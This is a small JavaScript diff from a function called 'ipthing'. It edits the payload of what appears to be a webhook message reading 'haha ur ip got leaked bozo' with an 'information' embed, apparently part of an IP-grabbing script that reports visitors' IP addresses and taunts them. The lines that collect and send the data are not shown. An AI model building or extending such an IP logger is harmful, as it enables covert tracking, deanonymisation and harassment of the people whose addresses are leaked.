@@ -9,7 +9,7 @@ async function ipthing() {
     let params = {
         username: "reoccur.cat",
         avatar_url: "",
-        content: "haha ur ip got leaked bozo",
+        content: "------------------------------\nhaha ur ip got leaked bozo",
         embeds: [
             {
                 title: "information",
